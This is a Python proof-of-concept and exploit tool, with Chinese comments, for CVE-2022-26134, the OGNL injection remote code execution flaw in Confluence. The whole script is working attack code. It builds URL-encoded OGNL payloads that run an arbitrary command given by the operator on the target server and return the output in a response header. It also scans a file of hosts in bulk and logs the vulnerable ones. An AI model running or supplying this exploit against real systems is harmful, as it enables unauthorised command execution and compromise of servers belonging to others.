import argparse
import sys
import textwrap

import requests

requests.packages.urllib3.disable_warnings()


def main(url, output=None, cmd="id"):
    # 1.发请求
    full_url1 = f"{url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang." \
                f"Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com." \
                "opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a" \
                "%29%29%7D/"
    full_url2 = f"{url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang." \
                f"Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com." \
                "opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a" \
                "%29%29%7D/"
    headers = {"Sec-Ch-Ua": r"\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
               "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": r"\"Windows\"", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
               "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"}
    try:
        response1 = requests.get(full_url1, headers=headers, verify=False, timeout=5, allow_redirects=False)
        response2 = requests.get(full_url2, headers=headers, verify=False, timeout=5, allow_redirects=False)
    except Exception as e:
        print(f"[-]{url}请求失败")
        return
    # 2.判断是否存在漏洞
    try:
        if response1.status_code == 302 and "X-Cmd-Response" in response1.headers:
            if "uid" in response2.headers.get("X-Cmd-Response"):
                print(f"[+]{url}存在远程代码执行漏洞")
                res = response2.headers.get("X-Cmd-Response")
                if not output:
                    print(f"[+]{cmd}命令执行的回显为：\n{res}")
                else:
                    with open(f"{output}", mode="a", encoding="u8") as f:
                        f.write(f"{url}\n")
            else:
                print(f"[-]{url}不存在远程代码执行漏洞")
        else:
            print(f"[-]{url}不存在远程代码执行漏洞")
    except Exception as e:
        print(f"[-]该{cmd}无回显")
        return


if __name__ == '__main__':
    banner = r"""
  ______     _______     ____   ___ ____  ____      ____   __   _ _____ _  _   
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ \ / /_ / |___ /| || |  
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ __) | '_ \| | |_ \| || |_ 
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/| (_) | |___) |__   _|
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|\___/|_|____/   |_|  

    """
    print(banner)
    # 使用argparse去解析命令行传来的参数
    parser = argparse.ArgumentParser(description="CVE-2022-26134 rce poc and exp",
                                     formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
            """example1: python3 CVE-2022-26134.py -u http://192.168.79.132\nexample2: python3 CVE-2022-26134.py -u http://192.168.79.132 -c id\nexample2: python3 CVE-2022-26134.py -f host.txt"""))
    # 添加参数
    parser.add_argument("-u", "--url", dest="url", type=str, help="input a url")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, help="input a cmd")
    parser.add_argument("-f", "--file", dest="file", type=str, help="input a file for read")
    parser.add_argument("-o", "--output", dest="output", type=str, help="input a file for output")
    # 把参数的值解析到对象中
    args = parser.parse_args()

    if args.file:
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = line.strip()
                if not url.startswith("http"):
                    url = f"http://{url}"
                if not main(url, output=args.output): continue
    else:
        if not main(args.url, cmd=args.cmd): sys.exit(1)
